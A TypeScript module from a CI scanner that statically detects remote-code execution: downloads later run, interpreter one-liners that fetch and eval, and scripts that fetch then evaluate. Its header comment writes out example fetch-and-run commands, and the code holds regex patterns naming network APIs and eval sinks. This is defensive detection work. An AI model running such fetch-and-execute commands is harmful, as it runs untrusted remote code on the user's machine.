// src/ci-check/fetch-exec.ts
// fw#481 A11: the fetch-and-run spellings that are not `curl ... | sh`.
//
// GTIG (2026-11-17) reports an intrusion set that edited `.claude/settings.json` in internal
// repositories so that starting Claude Code downloads a backdoor. The scan knew only a fetch word
// piped into a shell. Two other shapes run remote code just as well:
//   download-then-run  `curl -o /tmp/b URL && chmod +x /tmp/b && /tmp/b`, across lines in a script
//   inline fetch+eval  `node -e "https.get(URL, r => ... eval(d))"`, `python3 -c "exec(urlopen(URL).read())"`
// and a whole script file in a language with `eval` that fetches and evaluates.
//
// Static text only, never run. Linear (§L): one lexer pass over the text, set lookups after it.

import { onlyOfficialInstaller, onlyLocal, MAX_EXCUSED_PER_LINE } from './harmless';

type Tok = { t: string; op: boolean; at: number };

const OPS = ['&&', '||', '>>', ';', '|', '&', '>', '<', '\n'];

/** Shell-ish tokens: quoted spans stay one token (quotes dropped), operators are their own
 *  tokens. One pass. Text inside quotes is never split, so `echo "curl -o x u && ./x"` is one
 *  word, not a command. */
export function lex(text: string): Tok[] {
  const out: Tok[] = [];
  let cur = '';
  let start = -1;
  let q: string | null = null;
  const flush = () => {
    if (start >= 0) out.push({ t: cur, op: false, at: start });
    cur = '';
    start = -1;
  };
  for (let i = 0; i < text.length; i++) {
    const c = text[i];
    if (q) {
      if (c === q) q = null;
      else cur += c;
      continue;
    }
    if (c === '"' || c === "'") {
      if (start < 0) start = i;
      q = c;
      continue;
    }
    if (c === ' ' || c === '\t' || c === '\r') {
      flush();
      continue;
    }
    const op = OPS.find((o) => text.startsWith(o, i));
    if (op) {
      flush();
      out.push({ t: op, op: true, at: i });
      i += op.length - 1;
      continue;
    }
    if (start < 0) start = i;
    cur += c;
  }
  flush();
  return out;
}

const SEPARATORS = new Set(['&&', '||', ';', '|', '&', '\n']);
// Words that may stand before the command itself.
const PREFIX_WORDS = new Set(['nohup', 'exec', 'sudo', 'then', 'do', 'else', 'time', 'command']);
const SHELLS = new Set([
  'bash',
  'sh',
  'zsh',
  'dash',
  'ksh',
  'source',
  '.',
  'node',
  'nodejs',
  'bun',
  'deno',
  'python',
  'python2',
  'python3',
  'perl',
  'ruby',
  'php',
  'pwsh',
  'powershell',
]);

const base = (w: string) => w.slice(w.lastIndexOf('/') + 1).toLowerCase();
const norm = (p: string) => p.replace(/^\.\//, '');

/** A path a download command writes to, or null. `-` (stdout) and /dev/null are not files. */
function outputPath(
  cmd: string,
  words: string[],
  i: number
): { path: string; used: number } | null {
  const w = words[i];
  const next = words[i + 1];
  const take = (p: string | undefined, used: number) =>
    p && p !== '-' && p !== '/dev/null' && !p.startsWith('-') ? { path: p, used } : null;
  if (cmd === 'curl') {
    if (w === '-o' || w === '--output') return take(next, 2);
    if (w.startsWith('--output=')) return take(w.slice(9), 1);
    if (/^-[a-zA-Z]*o$/.test(w)) return take(next, 2); // -fsSLo FILE
  } else if (cmd === 'wget') {
    if (w === '-O' || w === '--output-document') return take(next, 2);
    if (w.startsWith('--output-document=')) return take(w.slice(18), 1);
    if (/^-[a-zA-Z]*O$/.test(w)) return take(next, 2); // -qO FILE
  } else if (/^-outfile$/i.test(w)) return take(next, 2); // iwr / Invoke-WebRequest
  return null;
}

const FETCHERS = new Set(['curl', 'wget', 'iwr', 'invoke-webrequest']);

export interface DownloadRun {
  /** The path that was downloaded and then run. */
  path: string;
  /** Index in the text where the run starts. */
  at: number;
}

/** A file downloaded by curl/wget/iwr and later run: made executable, started by its path, or
 *  handed to a shell or interpreter. A download whose every URL is a vendor's official installer
 *  or this machine is not remote code (§Q). `skip(at)` excuses a command at that index (a comment
 *  line, a printed message). */
export function findDownloadRun(
  text: string,
  skip: (at: number) => boolean = () => false
): DownloadRun | null {
  const toks = lex(text);
  const downloaded = new Set<string>();
  // §L: `skip` may read the whole line, so it is asked only about a command that matters (a
  // download with a target, or a run of a downloaded file), and at most MAX_EXCUSED times.
  let excusedLeft = MAX_EXCUSED_PER_LINE;
  const excused = (at: number) => excusedLeft > 0 && skip(at) && excusedLeft-- > 0;
  let i = 0;
  while (i < toks.length) {
    // One simple command: the words up to the next separator.
    const words: Tok[] = [];
    let j = i;
    for (; j < toks.length && !(toks[j].op && SEPARATORS.has(toks[j].t)); j++) words.push(toks[j]);
    i = j + 1;
    let k = 0;
    while (k < words.length && !words[k].op && PREFIX_WORDS.has(words[k].t)) k++;
    const head = words[k];
    if (!head || head.op) continue;
    const cmd = base(head.t);
    const plain = words.map((w) => w.t);
    if (FETCHERS.has(cmd)) {
      const targets: string[] = [];
      for (let w = k + 1; w < words.length; w++) {
        if (words[w].op && (words[w].t === '>' || words[w].t === '>>')) {
          const p = words[w + 1];
          if (p && !p.op && p.t !== '/dev/null') targets.push(norm(p.t));
          continue;
        }
        const o = outputPath(cmd, plain, w);
        if (o) targets.push(norm(o.path));
      }
      if (!targets.length) continue;
      const end = words[words.length - 1].at + words[words.length - 1].t.length;
      const segment = text.slice(head.at, end);
      if (onlyOfficialInstaller(segment) || onlyLocal(segment) || excused(head.at)) continue;
      for (const t of targets) downloaded.add(t);
      continue;
    }
    if (!downloaded.size) continue;
    // chmod +x FILE (or an octal mode with an execute bit)
    if (cmd === 'chmod') {
      const modeIdx = words.findIndex(
        (w, x) => x > k && /^(\+x|[ugoa]*\+[rw]*x|[0-7]*[1357][0-7]{0,2})$/.test(w.t)
      );
      if (modeIdx > 0)
        for (let w = modeIdx + 1; w < words.length; w++)
          if (downloaded.has(norm(words[w].t)) && !excused(head.at))
            return { path: words[w].t, at: head.at };
      continue;
    }
    if (downloaded.has(norm(head.t)) && !excused(head.at)) return { path: head.t, at: head.at };
    if (SHELLS.has(cmd)) {
      for (let w = k + 1; w < words.length; w++) {
        const t = words[w].t;
        // `-` (the program is on stdin) or inline code (`-c`, `-e`): the operands are arguments.
        if (t === '-' || /^-(c|e|-eval|command)$/i.test(t)) break;
        if (t.startsWith('-')) continue;
        if (downloaded.has(norm(t)) && !excused(head.at)) return { path: t, at: head.at };
        break; // the first operand is the program; later ones are its arguments
      }
    }
  }
  return null;
}

// Interpreters with an inline-code flag. The code is the next word (a quoted span is one word).
const INLINE_FLAG: Record<string, RegExp> = {
  node: /^(-e|--eval|-p|--print)$/,
  nodejs: /^(-e|--eval|-p|--print)$/,
  bun: /^(-e|--eval|-p|--print)$/,
  deno: /^eval$/,
  python: /^-c$/,
  python2: /^-c$/,
  python3: /^-c$/,
  perl: /^-[a-zA-Z]*[eE]$/,
  ruby: /^-[a-zA-Z]*e$/,
  php: /^-r$/,
  pwsh: /^-(c|command)$/i,
  powershell: /^-(c|command)$/i,
};

/** Network APIs in the languages above. */
export const NET_API_RE =
  /\bhttps?\.(get|request)\b|\brequire\s*\(\s*["'`](node:)?https?["'`]\s*\)|\bfrom\s+["'](node:)?https?["']|\bfetch\s*\(|\burllib\b|\burlopen\b|\brequests\.(get|post)\b|\bhttp\.client\b|\bNet::HTTP\b|\bLWP::|\bHTTP::Tiny\b|\bopen-uri\b|\bURI\.open\b|\bfile_get_contents\s*\(\s*["']?https?:|\bInvoke-(WebRequest|RestMethod)\b|\biwr\b|\birm\b|\bDownloadString\b|\bNet\.WebClient\b/i;
/** Running what was fetched: evaluation, or a process. */
const RUN_SINK_RE =
  /(?<![.\w$])eval\s*\(|\bnew\s+Function\s*\(|\bvm\.(runIn\w+|Script)\b|(?<![.\w$])exec\s*\(|\bexec(Sync|File|FileSync)\s*\(|\bspawn(Sync)?\s*\(|\bchild_process\b|\bsubprocess\b|\bos\.system\b|(?<![.\w$])system\s*\(|\biex\b|\bInvoke-Expression\b/i;

export interface InlineFetchRun {
  at: number;
  code: string;
}

/** An interpreter one-liner whose code both fetches over the network and runs code or a process. */
export function findInlineFetchRun(
  text: string,
  skip: (at: number) => boolean = () => false
): InlineFetchRun | null {
  const toks = lex(text);
  let excusedLeft = MAX_EXCUSED_PER_LINE; // §L: `skip` may read the whole line
  for (let i = 0; i < toks.length; i++) {
    const tk = toks[i];
    if (tk.op) continue;
    // Own keys only: a word like `constructor` or `toString` must not reach Object.prototype.
    const name = base(tk.t).replace(/^python3\.\d+$/, 'python3');
    const flag = Object.hasOwn(INLINE_FLAG, name) ? INLINE_FLAG[name] : undefined;
    if (!flag) continue;
    for (let j = i + 1; j < toks.length && !toks[j].op; j++) {
      if (!flag.test(toks[j].t)) continue;
      const code = toks[j + 1];
      if (
        code &&
        !code.op &&
        NET_API_RE.test(code.t) &&
        RUN_SINK_RE.test(code.t) &&
        // §Q: a vendor's own installer (`irm https://astral.sh/uv/install.ps1 | iex`) or this machine.
        !onlyOfficialInstaller(code.t) &&
        !onlyLocal(code.t) &&
        !(excusedLeft > 0 && skip(tk.at) && excusedLeft-- > 0)
      )
        return { at: tk.at, code: code.t };
      break;
    }
  }
  return null;
}

/** Languages where a whole script file can fetch and evaluate. */
/** Evaluation, per language. Not a process: a hook that calls an API and runs `git` is ordinary,
 *  and in JavaScript a bare `exec(` is child_process, not evaluation. */
const EVAL_SINKS: [RegExp, RegExp][] = [
  [
    /\.(js|mjs|cjs|ts|mts|cts)$/i,
    /(?<![.\w$])eval\s*\(|\bnew\s+Function\s*\(|\bvm\.(runIn\w+|Script)\b/,
  ],
  [/\.py$/i, /(?<![.\w])(exec|eval)\s*\(/],
  [/\.rb$/i, /(?<![.\w])(eval|instance_eval|class_eval)\s*[( ]/],
  [/\.pl$/i, /(?<![\w$])eval\s*[({$"]/],
  [/\.php$/i, /(?<![\w$>])eval\s*\(/],
  [/\.ps1$/i, /\bInvoke-Expression\b|\biex\b/i],
];

/** How far after a network call an evaluation still counts as evaluating what was fetched. */
export const FETCH_EVAL_WINDOW = 5;
/** Evaluating a local file the script opens is not remote code. */
const LOCAL_EVAL_RE =
  /\b(exec|eval)\s*\(\s*(open|Path)\s*\(|\b(exec|eval)\s*\(\s*(fs\.)?readFileSync\s*\(/;

/** A script file that fetches over the network and then evaluates code: an evaluation on the line
 *  of a network call or within FETCH_EVAL_WINDOW code lines after it. A file that fetches in one
 *  place and evaluates a local file somewhere else is not this shape (a skill that runs
 *  `exec(open("kernel.py").read())`, 2026-11-23 A/B). Returns the 1-based line of the
 *  evaluation, or null. `isComment` lines are not read. */
export function findFileFetchEval(
  path: string,
  content: string,
  isComment: (line: string) => boolean
): number | null {
  const sinkRe = EVAL_SINKS.find(([ext]) => ext.test(path))?.[1];
  if (!sinkRe) return null;
  const lines = content.split('\n');
  let since = Infinity; // code lines since the last network call
  for (let i = 0; i < lines.length; i++) {
    const l = lines[i];
    if (isComment(l) || !l.trim()) continue;
    if (NET_API_RE.test(l)) since = 0;
    if (
      since <= FETCH_EVAL_WINDOW &&
      sinkRe.test(l) &&
      !LOCAL_EVAL_RE.test(l) &&
      // §Q: a vendor's own installer or this machine on the evaluating line is not remote code.
      !onlyOfficialInstaller(l) &&
      !onlyLocal(l)
    )
      return i + 1;
    since++;
  }
  return null;
}
